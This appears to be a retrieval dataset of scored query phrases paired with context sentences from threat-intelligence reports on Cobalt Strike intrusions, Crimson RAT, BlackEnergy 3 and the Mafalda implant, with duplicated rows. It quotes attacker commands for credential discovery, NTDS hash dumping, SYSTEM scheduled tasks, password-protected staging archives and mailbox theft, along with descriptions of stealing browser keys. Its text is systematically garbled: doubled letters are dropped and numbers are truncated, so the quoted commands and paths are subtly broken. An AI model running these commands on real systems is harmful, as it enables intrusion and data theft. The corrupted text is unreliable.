3f3a0785d95b56f0cddca039498bc254,"To identify if privileged users are active on remote servers, the adversary makes use of PsLogList from Microsoft Sysinternals",0.8958957582987883,"['However the European owner of the acount received a text mesage with Simplified Chinese characters on the primary phone number in the midle of the night Eastern European Time (ET).', 'NC Group and Fox-IT identified that the language in the text-mesage for 2FA is based on the web browsers language setings used during the authentication flow.', 'Thus the 2FA code was sent with suporting Chinese text.', 'Acount discovery (T1087) With aces into the network of the victim, the adversary finds a way to instal a Cobalt Strike beacon on a system of the victim (se Execution).', 'But before doing so, we observed the adversary checking the curent permisions of the obtained user acount with the folowing comands: net user net user Administrator net user <username> /domain net localgroup administrators If the user acount doesnt have local administrative or domain administrative permisions, the adversary atempts to discover which local or domain admin acounts exist, and exfiltrates the admins usernames.', 'To identify if privileged users are active on remote servers, the adversary makes use of PsLogList from Microsoft Sysinternals to retrieve the Security event logs.', 'The built-in Windows quser-comand to show loged on users is also heavily used by them.', 'If such a privileged user was recently active on a server the adversary executes Cobalt Strikes built-in Mimikatz to dump its pasword hashes.', 'Privilege escalation (TA04) The adversary started a pasword spraying atack against those domain admin acounts, and sucesfuly got a valid domain admin acount this way.', 'In other cases, the adversary moved lateraly to another system with a domain admin loged in.', 'We observed the use of Mimikatz on this system 3/2 and saw the hashes of the loged in domain admin acount going through the comand and control chanel of the adversary.']"
3f3a0785d95b56f0cddca039498bc254,to identify if privileged users are active on the systems,0.7523042689727502,"['You can find a sumary of most of the comands used by the adversary to perform discovery at the end of this article.', 'Acount discovery tol: PsLogList Comand used: psloglist.exe -acepteula -x security -s -a <date> This comand exports a text file with coma separated fields.', 'The text files contain the contents of the Security Event log after the specified date.', 'Psloglist is part of the Sysinternals tolkit from Mark Rusinovich (Microsoft).', 'The tol was used by the adversary on various systems to write events from the Windows Security Event Log to a text file.', 'A posible intent of the adversary could be to identify if privileged users are active on the systems.', 'If such a privileged user was recently active on a server the actor executes Cobalt Strikes built-in Mimikatz to dump its credentials or pasword hash.', 'Acount discovery tol: NtdsAudit Comand used: msadcs.exe ""NTDS.dit"" -s ""SYSTEM"" -p RecordedTV_pdmp.txt -users-csv RecordedTV_users.csv It imports the specified Active Directory database NTDS.dit and registry file SYSTEM and exports the found pasword hashes into RecordedTV_pdump.txt and user details in RecordedTV_users.csv.', 'The NtdsAudit utility is an auditing tol for Active Directory databases.', 'It alows the user to colect useful statistics related to acounts and paswords.', 'The utility was found on various systems of a victim and matches the NtdsAudit.exe program file version v2.0.5 published on the GitHub project page.']"
3f3a0785d95b56f0cddca039498bc254,"With this valid admin account, a Cobalt Strike beacon is loaded into memory of patient zero.",0.8766844100791029,"['These credentials are used in a credential stufing or pasword spraying atack against the victims remote services, such as webmail or other internet reachable mail services.', 'After obtaining a valid acount, they use this acount to aces the victims VPN, Citrix or another remote service that alows aces to the network of the victim.', 'Information regarding these remotes services is taken from the mailbox, cloud drive, or other cloud resources acesible by the compromised acount.', 'As son as they have a fothold on a system (also known as patient zero or index case), they check the permisions of the acount on that system, and atempt to obtain a list of acounts with administrator privileges.', 'With this list of administrator-acounts, the adversary performs another pasword spraying atack 1/2 until a valid admin acount is compromised.', 'With this valid admin acount, a Cobalt Strike beacon is loaded into memory of patient zero.', 'From here on the adversary stops using the victims remote service to aces the victims network, and starts using the Cobalt Strike beacon for remote aces and comand and control.', 'Network discovery and lateral movement The adversary continues their discovery of the victims network from patient zero.', 'Various scans and queries are used to find proxy setings, domain controlers, remote desktop services, Citrix services, and network shares.', 'If the obtained valid acount is already member of the domain admins group, the first lateral move in the network is usualy to a domain controler where the adversary also deploys a Cobalt Strike beacon.', 'Otherwise, a jump host or other system likely used by domain admins is found and equiped with a Cobalt Strike beacon.']"
3f3a0785d95b56f0cddca039498bc254,"After this the adversary dumps the domain admin credentials from the memory of this machine, continues lateral moving through the network,",0.7721081248615745,"['From here on the adversary stops using the victims remote service to aces the victims network, and starts using the Cobalt Strike beacon for remote aces and comand and control.', 'Network discovery and lateral movement The adversary continues their discovery of the victims network from patient zero.', 'Various scans and queries are used to find proxy setings, domain controlers, remote desktop services, Citrix services, and network shares.', 'If the obtained valid acount is already member of the domain admins group, the first lateral move in the network is usualy to a domain controler where the adversary also deploys a Cobalt Strike beacon.', 'Otherwise, a jump host or other system likely used by domain admins is found and equiped with a Cobalt Strike beacon.', 'After this the adversary dumps the domain admin credentials from the memory of this machine, continues lateral moving through the network, and places Cobalt Strike beacons on servers for increased persistent aces into the victims network.', 'If the victims network contains other Windows domains or diferent network security zones, the adversary scans and finds the trust relationships and jump hosts, atempting to move into the other domains and security zones.', 'The adversary is typicaly able to perform al the steps described above within one day.', 'During this proces, the adversary identifies data of interest from the network of the victim.', 'This can be anything from file and directory-listings, configuration files, manuals, email stores in the guise of OST- and PST-files, file shares with intelectual property (IP), and personaly identifiable information (PI) scraped from memory.', 'If the data is smal enough, it is exfiltrated through the comand and control chanel of the Cobalt Strike beacons.']"
3f3a0785d95b56f0cddca039498bc254,"the adversary copying results of the discovery phase, like file- and directory lists from local systems,",0.7705240887393293,"['But first: How did they get the tols on the victims systems?', 'The adversary copied those tols over SMB from compromised system to compromised system wherever they neded these tols.', 'A few examples of comands we observed: 6/2 copy get.exe \\<ip>\\c$\\windows\\temp\\ copy msadc* \\<hostname>\\c$\\Progra~1\\Comon~1\\System\\msadc\\ copy update.exe \\<ip>\\c$\\windows\\temp\\ move ak02.bat \\<ip>\\c$\\windows\\temp\\update.bat Colection (TA09) In preparation of exfiltration of the data neded for their objective, the adversary colected the data from various sources within the victims network.', 'As described before, the adversary colected data from an information repository, Microsoft SharePoint Online in this case.', 'This document was exfiltrated and used to continue the intrusion via a company portal and VPN.', 'In al cases weve sen the adversary copying results of the discovery phase, like file- and directory lists from local systems, network shared drives, and file shares on remote systems.', 'But email colection is also important for this adversary: with every intrusion we saw the mailbox of some users being copied, from both local and remote systems: wmic /node:<ip> proces cal create ""cmd /c copy c:\\Users\\<username>\\<path>\\backup.pst c:\\windows\\temp\\backup.pst"" copy ""i:\\<path>\\<username>\\My Documents\\<filename>.pst"" copy \\<hostname>\\c$\\Users\\<username>\\ApData\\Local\\Microsoft\\Outlok*.ost Files and folders of interest are colected as wel and staged for exfiltration.', 'The goal of targeting some victims apears to be to obtain Pasenger Name Records (PNR).', 'How this PNR data is obtained likely difers per victim, but we observed the usage of several custom DL files used to continuously retrieve PNR data from memory of systems where such data is typicaly procesed, such as flight boking servers.', 'The DLs used were side-loaded in memory on compromised systems.', 'After placing the DL in the apropriate directory, the actor would change the date and time stamps on the DL files to blend in with the other legitimate files in the directory.']"
3f3a0785d95b56f0cddca039498bc254,This activity group always uses a renamed version of rar.exe.,1.0,"['Weve sen the adversary staging data on a remote system or on the local system.', 'Most of the times the data is compresed and copied at the same time.', 'Only a handful of times the adversary copies the data first before compresing (archive colected data) and exfiltrating it.', 'The adversary compreses and encrypts the data by using WinRAR from the comand-line.', 'The filename of the comand-line executable for WinRAR is RAR.exe by default.', 'This activity group always uses a renamed version of rar.exe.', 'We have observed the folowing filenames overlaping al intrusions: jucheck.exe RecordedTV.ms teredo.tmp update.exe msadcs1.exe The adversary typicaly places the executables in the folowing folders: C:\\Users\\Public\\Libraries\\ C:\\Users\\Public\\Videos\\ 7/2 C:\\Windows\\Temp\\ The folowing four diferent variants of the use of rar.exe as update.exe we have observed: update a -m5 -hp<pasword> <target_filename> <source> update a -m5 -r -hp<pasword> <target_filename> <source> update a -m5 -inul -hp<pasword> <target_filename> <source> update a -m5 -r -inul -hp<pasword> <target_filename> <source> The comand lines parameters have the folowing efect: a = ad to archive.', 'm5 = use compresion level 5. r = recurse subfolders.', 'inul = supres eror mesages.', 'hp<pasword> = encrypt both file data and headers with pasword.', 'The used pasword, file extensions for the staged data difer per intrusion.']"
3f3a0785d95b56f0cddca039498bc254,The DLL’s used were side-loaded in memory on compromised systems.,0.764648627630302,"['This document was exfiltrated and used to continue the intrusion via a company portal and VPN.', 'In al cases weve sen the adversary copying results of the discovery phase, like file- and directory lists from local systems, network shared drives, and file shares on remote systems.', 'But email colection is also important for this adversary: with every intrusion we saw the mailbox of some users being copied, from both local and remote systems: wmic /node:<ip> proces cal create ""cmd /c copy c:\\Users\\<username>\\<path>\\backup.pst c:\\windows\\temp\\backup.pst"" copy ""i:\\<path>\\<username>\\My Documents\\<filename>.pst"" copy \\<hostname>\\c$\\Users\\<username>\\ApData\\Local\\Microsoft\\Outlok*.ost Files and folders of interest are colected as wel and staged for exfiltration.', 'The goal of targeting some victims apears to be to obtain Pasenger Name Records (PNR).', 'How this PNR data is obtained likely difers per victim, but we observed the usage of several custom DL files used to continuously retrieve PNR data from memory of systems where such data is typicaly procesed, such as flight boking servers.', 'The DLs used were side-loaded in memory on compromised systems.', 'After placing the DL in the apropriate directory, the actor would change the date and time stamps on the DL files to blend in with the other legitimate files in the directory.', 'Adversaries aiming to exfiltrate large amounts of data wil often use one or more systems or storage locations for intermitent storage of the colected data.', 'This proces is caled staging and is one of the of the activities that NC Group and Fox-IT has observed in the analysed C2 trafic.', 'Weve sen the adversary staging data on a remote system or on the local system.', 'Most of the times the data is compresed and copied at the same time.']"
db2220059c0ca8d39dca806b090053e1,Use scheduled tasks,0.7978601061676975,"['ESET Research white papers TLP: WHITE JUMPING THE AIR GAP: 15 years of nation-state efort Authors: Alexis Dorais-Joncas Facundo Munz December 2021 2 JUMPING THE AIR GAP: 15 years of nation-state efort TLP: WHITE TABLE OF CONTENTS 1.', 'Executive sumary .', '.', '.', '.', '.', '.', '.']"
3f3a0785d95b56f0cddca039498bc254,The adversary heavily relies on scheduled tasks for executing a batch-file (.bat) to perform their tasks.,1.0,"['The colected information alows Fox-IT to corelate Cobalt Strike team servers, based on various configuration setings.', 'Because of this, historic information was available during this investigation.', 'Whenever a Cobalt Strike C2 chanel was identified, Fox-IT performed lokups into the colection database.', 'If a match was found, the configuration of the Cobalt Strike team server was analysed.', 'This configuration was then compared against the other Cobalt Strike team servers to check for similarities in for example domain names, version number, URL, and various other setings.', 'The adversary heavily relies on scheduled tasks for executing a batch-file (.bat) to perform their tasks.', 'An example of the creation of such a scheduled task by the adversary: schtasks /create /ru ""SYSTEM"" /tn ""update"" /tr ""cmd /c c:\\windows\\temp\\update.bat"" /sc once /f /st 06:59:0 The batch-files apear to be used to load the Cobalt Strike beacon, but also to perform discovery comands on the compromised system.', '4/2 Persistence (TA03) The adversary loads the Cobalt Strike beacon in memory, without any persistence mechanisms on the compromised system.', 'Once the system is reboted, the beacon is gone.', 'The adversary is stil able to have persistent aces by instaling the beacon on systems with high uptimes, such as server.', 'Besides using the Cobalt Strike beacon, the adversary also searches for VPN and firewal configs, posibly to function as a backup aces into the network.']"
3f3a0785d95b56f0cddca039498bc254,"An example of the creation of such a scheduled task by the adversary:
schtasks /create /ru ""SYSTEM"" /tn ""update"" /tr ""cmd /c c:\windows\temp\update.bat"" /sc once /f /st 06:59:00",0.7582040569364502,"['Because of this, historic information was available during this investigation.', 'Whenever a Cobalt Strike C2 chanel was identified, Fox-IT performed lokups into the colection database.', 'If a match was found, the configuration of the Cobalt Strike team server was analysed.', 'This configuration was then compared against the other Cobalt Strike team servers to check for similarities in for example domain names, version number, URL, and various other setings.', 'The adversary heavily relies on scheduled tasks for executing a batch-file (.bat) to perform their tasks.', 'An example of the creation of such a scheduled task by the adversary: schtasks /create /ru ""SYSTEM"" /tn ""update"" /tr ""cmd /c c:\\windows\\temp\\update.bat"" /sc once /f /st 06:59:0 The batch-files apear to be used to load the Cobalt Strike beacon, but also to perform discovery comands on the compromised system.', '4/2 Persistence (TA03) The adversary loads the Cobalt Strike beacon in memory, without any persistence mechanisms on the compromised system.', 'Once the system is reboted, the beacon is gone.', 'The adversary is stil able to have persistent aces by instaling the beacon on systems with high uptimes, such as server.', 'Besides using the Cobalt Strike beacon, the adversary also searches for VPN and firewal configs, posibly to function as a backup aces into the network.', 'We havent sen the adversary use those aces methods after the first Cobalt Strike beacons were instaled.']"
3f3a0785d95b56f0cddca039498bc254,batch files for automation.,0.7527219589771681,"['In sumary: The adversary: Working hours match with GMT+8.', 'Infrastructure: apspot.com and azuredge.net for C2 with a strong overlap in naming convention for subdomains and actual overlap in some subdomains betwen intrusions.', 'Capability: Pasword spraying/credential stufing.', 'Cobalt Strike.', 'Copy NTDS.dit.', 'Use scheduled tasks and batch files for automation.', 'The use of LOLBins.', 'WinRAR.', 'Cloud exfil tol and exfil to OneDrive.', 'Erasing Windows Event Logs, files and tasks.', 'Overlap in filenames for tols, staged data, and folders.']"
3f3a0785d95b56f0cddca039498bc254,executing a batch-file (.bat) to perform their tasks.,0.7612040367503298,"['The colected information alows Fox-IT to corelate Cobalt Strike team servers, based on various configuration setings.', 'Because of this, historic information was available during this investigation.', 'Whenever a Cobalt Strike C2 chanel was identified, Fox-IT performed lokups into the colection database.', 'If a match was found, the configuration of the Cobalt Strike team server was analysed.', 'This configuration was then compared against the other Cobalt Strike team servers to check for similarities in for example domain names, version number, URL, and various other setings.', 'The adversary heavily relies on scheduled tasks for executing a batch-file (.bat) to perform their tasks.', 'An example of the creation of such a scheduled task by the adversary: schtasks /create /ru ""SYSTEM"" /tn ""update"" /tr ""cmd /c c:\\windows\\temp\\update.bat"" /sc once /f /st 06:59:0 The batch-files apear to be used to load the Cobalt Strike beacon, but also to perform discovery comands on the compromised system.', '4/2 Persistence (TA03) The adversary loads the Cobalt Strike beacon in memory, without any persistence mechanisms on the compromised system.', 'Once the system is reboted, the beacon is gone.', 'The adversary is stil able to have persistent aces by instaling the beacon on systems with high uptimes, such as server.', 'Besides using the Cobalt Strike beacon, the adversary also searches for VPN and firewal configs, posibly to function as a backup aces into the network.']"
0dde8d035ff9d35ba88103c92a7fd1ef,Malicious documents that implement this technique require users to double-click a document element.,1.0,"['The malicious documents we analyzed stage Crimson RAT using Microsoft Ofice macros or OLE embeding.', 'The macro code executes when the documents are opened, and its functionality is consistent with known Transparent Tribe macro variants.', 'The macros create and decompres an embeded archive file in the 1/4 %ALUSERSPROFILE% directory (C:\\ProgramData) and execute the Crimson RAT payload within.', 'Some macros insert text in the document, which is typicaly education-themed content relating to India.', 'Macro implementation Macro-inserted document text In adition to macros, we observed that Transparent Tribe have adopted OLE embeding as a technique to stage Crimson RAT.', 'Malicious documents that implement this technique require users to double-click a document element.', 'The documents distributed by Transparent Tribe typicaly display an image (a View Document graphic) indicating that the document content is locked.', 'This lures users to double-click the graphic to view the content, which activates an OLE package that stores and executes Crimson RAT masquerading as an update proces (MicrosoftUpdate.exe).', 'The View Document graphic 2/4 OLE stream that stores Crimson RAT Transparent Tribe is known to experiment with diferent malware staging techniques, which include distributing executables with embeded documents or documents that execute designated Crimson RAT loaders.', 'The adoption of OLE embeding further highlights the groups continuous experimentation with malware staging techniques.', 'Crimson RAT Implementations We observed a variety of Crimson RAT .NET implementations, with compilation timestamps betwen July and September 202.']"
0dde8d035ff9d35ba88103c92a7fd1ef,"implement different obfuscation techniques of varying intensities, for example, simple function name malformation and dynamic string resolution.",0.8509789737860829,"['This aligns with a documented Crimson RAT variant with the identifier S.L.2.2., which has used the sunyleone.hopto[.', ']org domain for C2 purposes.', 'As an anti-analysis measure, Crimson RAT variants delay their execution for a given time period, for example, 61, 180, or 241 seconds.', 'Most of the Crimson RAT variants we analyzed evaluate whether they execute at a machine named G51JW or DESKTOP-B83U7C5 and establish persistence by creating a registry key under \\SOFTWARE\\Microsoft\\Windows\\CurentVersion\\Run only if the victims machine name difers.', 'G51JW or 3/4 DESKTOP-B83U7C5 may be the names of the machines where Crimson RAT developers have ben runing test executions.', 'Crimson RAT variants implement diferent obfuscation techniques of varying intensities, for example, simple function name malformation and dynamic string resolution.', 'We observed the use of the Eazfuscator obfuscator in a Crimson RAT sample named NewOrleans.', 'Evidence sugests that the Crimson RAT developers have patched the routine that evaluates the trial period of Eazfuscator to enable the execution of the malware after the trial period expires.', 'Eazfuscator trial period evaluation in NewOrleans Eazfuscator trial expiry mesage With previous variants of Crimson RAT obfuscated using Crypto Obfuscator, the adition of Eazfuscator to the obfuscation techniques used by Transparent Tribe highlights the continuous maintenance and development of the RAT.', 'Conclusion Transparent Tribe is a highly motivated and persistent threat actor that regularly updates its malware arsenal, operational playbok, and targets.', 'Our analysis further demonstrates this characteristic of the group by spotlighting the adoption of OLE embeding as a technique for staging malware from lure documents and the Eazfuscator obfuscator to protect Crimson RAT implementations.']"
0346a65ab2042ab204afcb0b4cd91a89,"obfuscated using Crypto Obfuscator,",0.7643919443851735,"['Macro code: Workbok Open Figure 8.', 'Macro code: Main function which is caled inside Workbok Open event XOR Key : ""MxjnbvbX%$#@c%!', '@#$C%^&* (K(*&K0^%$W$@!&@#$C%EGxcel^MicrosoLKHGFD^%$W@2017!&^%$#lx^&%$0"" 5/10 Figure 9.', 'Macro code: XOR function msword.exe is an SFX archive executable, which contains multiple malicious executable files as shown in Figure 10.', 'Figure 10. msword.exe contents File name File info 3_5 LimeRAT [Runtime: .Net Framework 2.0] 4 AsyncRAT [Runtime: .Net Framework 4] 4_5 AsyncRAT [Runtime: .Net Framework 4.5] 4_5_1 AsyncRAT [Runtime: .Net Framework 4.5.1] 4_5_2 AsyncRAT [Runtime: .Net Framework 4.5.2] 4_6 AsyncRAT [Runtime: .Net Framework 4.6] 4_6_1 AsyncRAT [Runtime: .Net Framework 4.6.1] 4_7 AsyncRAT [Runtime: .Net Framework 4.7 4_7_2 AsyncRAT [Runtime: .Net Framework 4.7.2] igfx.exe Delphi compiled file instals RAT file acording to available .Net version Upon execution, ""msword.exe"" drops the RAT files shown in the table above.', 'These RAT executables are obfuscated using Crypto Obfuscator For .Net.', 'msword.exe then starts the proces igfx.exe which performs the folowing actions: Checks the .NET version in the registry; based on the instaled version, renames the compatible RAT file to excel.exe Checks the registry keys to determine the .NET version in the order listed below.', 'If found, a version of the runtime file (AsyncRAT) is picked coresponding to the .NET version.', 'If none of the registry keys are found, the file 3_5 (LimeRAT) is used.', 'HKLM\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4 HKLM\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4.5 HKLM\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4.5.1 HKLM\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4.5.2 6/10 HKLM\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4.6 HKLM\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4.6.1 HKLM\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4.7 HKLM\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4.7.2 Sets the file atributes of excel.exe to hiden and read-only.', 'Ads a Run registry entry for persistence.']"
1d4f131e69be4d2e5a8bf88bd4c9f4fa,log keystrokes,0.9372036161740571,"['properly restricted and asigned to only those who require them.', 'STEP 7: HARVEST CREDENTIALS Delivered BlackEnergy 3 malware plugins conduct STEP 8: LATERAL MOVEMENT credential harvesting and network discovery AND TARGET IDENTIFICATION ON functions.', 'CORPORATE NETWORK Threat actors conduct internal reconaisance on Location: Corporate network the corporate network to discover potential targets Action: Active threat actor activity, malware and expand aces.', 'execution Location: Corporate network Timeline: June 2015December 2015 Action: Active threat actor activity, malware Device/aplication: Windows OS workstations, execution Windows domain controlers, virtual private Timeline: June 2015December 2015 network (VPN) service deployed in control environment Device/aplication: Discovered systems, including networked uninteruptable power Role in infrastructure: These systems suport suply (UPS) devices, data center servers, busines operations, manage permisions and a telephone comunications server, and domain aces, and provide remote network employe workstations aces respectively.', 'Role in infrastructure: Internal reconaisance Exploitation method: Threat actors use delivered eforts could potentialy include al deployed BlackEnergy 3 plugins to gather stored credentials devices on the corporate network.', 'or log keystrokes.', 'After gathering valid credentials for user with administrator privileges, threat actors Exploitation method: Threat actors likely use a use the stolen administrator credentials to aces combination of valid user credentials and the domain controler, recover aditional creden- BlackEnergy 3 plugins developed to conduct tials, and create new privileged acounts.', 'network discovery.', 'VS.dl plugin is likely used to leverage MS Sysinternals PsExec to establish Impact: Threat actors obtain valid credentials remote conections to workstations and servers.', 'enabling them to expand aces acros the corporate network and into the control environment, Impact: Threat actors are able to enumerate the ensure persistent aces, and blend into regular systems deployed acros the network, identify network trafic.', 'targets, and begin preparations for final atack.']"
1d4f131e69be4d2e5a8bf88bd4c9f4fa,log keystrokes,0.9372036161740571,"['properly restricted and asigned to only those who require them.', 'STEP 7: HARVEST CREDENTIALS Delivered BlackEnergy 3 malware plugins conduct STEP 8: LATERAL MOVEMENT credential harvesting and network discovery AND TARGET IDENTIFICATION ON functions.', 'CORPORATE NETWORK Threat actors conduct internal reconaisance on Location: Corporate network the corporate network to discover potential targets Action: Active threat actor activity, malware and expand aces.', 'execution Location: Corporate network Timeline: June 2015December 2015 Action: Active threat actor activity, malware Device/aplication: Windows OS workstations, execution Windows domain controlers, virtual private Timeline: June 2015December 2015 network (VPN) service deployed in control environment Device/aplication: Discovered systems, including networked uninteruptable power Role in infrastructure: These systems suport suply (UPS) devices, data center servers, busines operations, manage permisions and a telephone comunications server, and domain aces, and provide remote network employe workstations aces respectively.', 'Role in infrastructure: Internal reconaisance Exploitation method: Threat actors use delivered eforts could potentialy include al deployed BlackEnergy 3 plugins to gather stored credentials devices on the corporate network.', 'or log keystrokes.', 'After gathering valid credentials for user with administrator privileges, threat actors Exploitation method: Threat actors likely use a use the stolen administrator credentials to aces combination of valid user credentials and the domain controler, recover aditional creden- BlackEnergy 3 plugins developed to conduct tials, and create new privileged acounts.', 'network discovery.', 'VS.dl plugin is likely used to leverage MS Sysinternals PsExec to establish Impact: Threat actors obtain valid credentials remote conections to workstations and servers.', 'enabling them to expand aces acros the corporate network and into the control environment, Impact: Threat actors are able to enumerate the ensure persistent aces, and blend into regular systems deployed acros the network, identify network trafic.', 'targets, and begin preparations for final atack.']"
ac0df47c7a7c71929ea786a25a27fdd7,decryption,0.8539491256374303,"['This indicates that the Mafalda implant is a maintained, ongoing project.', 'The figures below depict the functions in the older and the newer Mafalda variant that handle the procesing of the diferent backdor comands based on the comand number.', 'Fig 8: Older Mafalda variant: Procesing of backdor comands THE MYSTERY OF METADOR | AN UNATRIBUTED THREAT HIDING IN TELCOS, ISPS, AND UNIVERSITIES 13 Fig 9: Newer Mafalda variant: Procesing of backdor comands THE MYSTERY OF METADOR | AN UNATRIBUTED THREAT HIDING IN TELCOS, ISPS, AND UNIVERSITIES 14 1 htps:/atack.mitre.org/software/S073/ The ful unobfuscated list of comands, along with the developers descriptions, are available in the Mafalda section of the Technical Apendix.', 'The folowing functionality is only available in the newer Mafalda variant: Network and system configuration reconaisance.', 'Information theft and implant orchestration.', 'Data decryption.', 'Filesystem operations.', 'The folowing is a sumary of some of the newer Mafalda comands: Comand 60 Reads the content of the file %USERPROFILE%\\ApData\\Local\\Gogle\\Chrome\\User Data\\Local State and sends the file content to the C2 server as part of a packet with a name prefixed with lot\\.', 'The Local State file stores security-relevant data, such as an encryption key that Chrome uses to protect cokies.', 'The environment variable %USERPROFILE% expands to the path to the profile folder of the user in whose context Mafalda runs, such as C:\\Users\\test for the user test.', 'Comand 61 Decrypts atacker-provided data using the DPAPI (Data Protection Aplication Programing Interface) key of the platform where Mafalda runs.']"
ac0df47c7a7c71929ea786a25a27fdd7,decryption,0.8539491256374303,"['This indicates that the Mafalda implant is a maintained, ongoing project.', 'The figures below depict the functions in the older and the newer Mafalda variant that handle the procesing of the diferent backdor comands based on the comand number.', 'Fig 8: Older Mafalda variant: Procesing of backdor comands THE MYSTERY OF METADOR | AN UNATRIBUTED THREAT HIDING IN TELCOS, ISPS, AND UNIVERSITIES 13 Fig 9: Newer Mafalda variant: Procesing of backdor comands THE MYSTERY OF METADOR | AN UNATRIBUTED THREAT HIDING IN TELCOS, ISPS, AND UNIVERSITIES 14 1 htps:/atack.mitre.org/software/S073/ The ful unobfuscated list of comands, along with the developers descriptions, are available in the Mafalda section of the Technical Apendix.', 'The folowing functionality is only available in the newer Mafalda variant: Network and system configuration reconaisance.', 'Information theft and implant orchestration.', 'Data decryption.', 'Filesystem operations.', 'The folowing is a sumary of some of the newer Mafalda comands: Comand 60 Reads the content of the file %USERPROFILE%\\ApData\\Local\\Gogle\\Chrome\\User Data\\Local State and sends the file content to the C2 server as part of a packet with a name prefixed with lot\\.', 'The Local State file stores security-relevant data, such as an encryption key that Chrome uses to protect cokies.', 'The environment variable %USERPROFILE% expands to the path to the profile folder of the user in whose context Mafalda runs, such as C:\\Users\\test for the user test.', 'Comand 61 Decrypts atacker-provided data using the DPAPI (Data Protection Aplication Programing Interface) key of the platform where Mafalda runs.']"
41d6e1e379006c93e59f114b3161977e,decryption,0.8016585728073772,"['Payload .VBS file Analysis The folowing screnshot shows a part of the .VBS payload file droped by .RTF file.', 'First line is the encrypted .dl 4th line contains Key to decrypt the .dl.', 'Remaining part is self-explanatory.', 'The instruction c = Crypt(c,k) function decrypts the encrypted dl and returns the decrypted dl.', '(Se the screnshot above) c= encrypted dl.', 'k = decryption key.', 'Folowing function writes byte by byte to the droped.dl file.', 'Finaly, the folowing code executes the regsvr32 comand to run the wmiprvse.dl in silent mode and sets the run key in registry.', 'Payload wmiprvse.dl file Analysis This first level of deobfuscation in wmiprvse.dl takes around 3-4 minutes to finish.', 'Then it alocates memory using VirtualAloc and writes the unpacked code to newly alocated memory before it jumps to the unpacked code as shown in folowing scren shot.', 'This dl has 3 layers of unpacking.']"
41d6e1e379006c93e59f114b3161977e,decryption,0.8016585728073772,"['Payload .VBS file Analysis The folowing screnshot shows a part of the .VBS payload file droped by .RTF file.', 'First line is the encrypted .dl 4th line contains Key to decrypt the .dl.', 'Remaining part is self-explanatory.', 'The instruction c = Crypt(c,k) function decrypts the encrypted dl and returns the decrypted dl.', '(Se the screnshot above) c= encrypted dl.', 'k = decryption key.', 'Folowing function writes byte by byte to the droped.dl file.', 'Finaly, the folowing code executes the regsvr32 comand to run the wmiprvse.dl in silent mode and sets the run key in registry.', 'Payload wmiprvse.dl file Analysis This first level of deobfuscation in wmiprvse.dl takes around 3-4 minutes to finish.', 'Then it alocates memory using VirtualAloc and writes the unpacked code to newly alocated memory before it jumps to the unpacked code as shown in folowing scren shot.', 'This dl has 3 layers of unpacking.']"
c53da9ec05d78bde1eab4d813ea4924f,decryption,0.780670919688295,"['{ 3. meta: 4.', '5. description = ""Detects obfuscation paterns used in HALFRIG.', 'This rule wasn\'t tested against large dataset, it should be used for threat hunting and not on services like VTI.""', '6.', '7. strings: 8.', '/ Decryption constants and decryption operation 9.', '$ = {48 B 0B 91 09 19 4D FD 9B F3 } 10.', '1.', '$ = {4D 8D 40 01 48 8B CA 48 8B C2 48 C1 E9 38 48 83 C9 01 48 C1 E0 08 48 8B D1 48 3 D0} 12.', '13.', '$ = {C7 05 [3] 0 F7 91 4D 01 } 14.']"
9f37e71695d9bbc0a254d54d1edbdb58,decryption,0.7633052540464057,"['Hashes of the analyzed samples .', '6 2.', 'Similarities and diferences .', '7 2.1.', 'General details .', '7 2.2.', 'String decryption .', '9 2.3. AES encryption of the configuration file .', '14 2.4.', 'Format of the (encrypted) configuration file .', '24 2.5.']"
9f37e71695d9bbc0a254d54d1edbdb58,decryption,0.7633052540464057,"['Hashes of the analyzed samples .', '6 2.', 'Similarities and diferences .', '7 2.1.', 'General details .', '7 2.2.', 'String decryption .', '9 2.3. AES encryption of the configuration file .', '14 2.4.', 'Format of the (encrypted) configuration file .', '24 2.5.']"
6989a0b5e412226c0da9e9b81432c9db,encrypted,0.8440311620382885,"['The embeded mesage is similar to a mesage left by another ransomware variant known as Target7.', 'We believe it was most likely copied, posibly as a false flag, and that the two threat actors are not related.', 'The mesage is as folows: Helo [REDACTED] Please, check this mesage in detail and contact a person from IT department.', 'Your personam computer has ben infected by ransomware virus.', 'Al your personal files ( Pasport,visas etc. )', 'are encrypted .', 'If you want to restore your files including your clients personal data, you wil ned to make the payment.', 'Otherwise al your files wil be posted in the internet which may lead you to the los of reputation and cause the troubles for your busines .', 'let us know if you have any questions.', ""Our email adres : [REDACTED]@protonmail.com If you don't get an answer from us within one day , we wil contact you at [REDACTED] Fig 18: Apostle ransom note Interestingly, the function responsible for writing the mesage to file atempts to replace strings such as <hostname> and <id> to customize the mesage to the machine."", 'Those strings, however, were not found in the mesage embeded in this sample, which might indicate there are aditional, yet undiscovered, versions of this ransomware.']"
7c7b25b6a53baebfa2ab0f310bd10b17,encrypted,0.786116526347214,"['In this type of atack the malicious actor aims to bypas the aplications caching capability by sending random (or not recognizable) GET requests to flod the aplication server with requests to handle.', 'Persistent DoS Atacks (i.e.', 'multi-day).', 'This type of DoS is famous for its two stages of infecting hosts and creating botnet of zombies who pretend to be a wel defended endpoint and the atack phase that has ben sen to take from minutes to over multiple days.', 'The vector varies from network type atacks to aplication layer atacks235.', 'Encrypted Atacks.', 'The rise of using encrypted services and trafic (SL) on the web has atracted diferent levels of DoS atacks.', 'This includes atacks on the aplication level (flod atacks, bruteforce etc.', '), network level and the protocol level (i.e.', 'SL renegotiation or downgrade) making it harder for defenders and tolsets to recognise malicious trafic from legitimate236.', '3.5.5 Specific atack vectors Acording to Nexusgaurd Q2 2018 report, most of the atacks were focused on hit-run tactics and specificaly during peak times to strike their targets with UDP, TCP (SYN) and ICMP flods being the top 3 vectors.']"
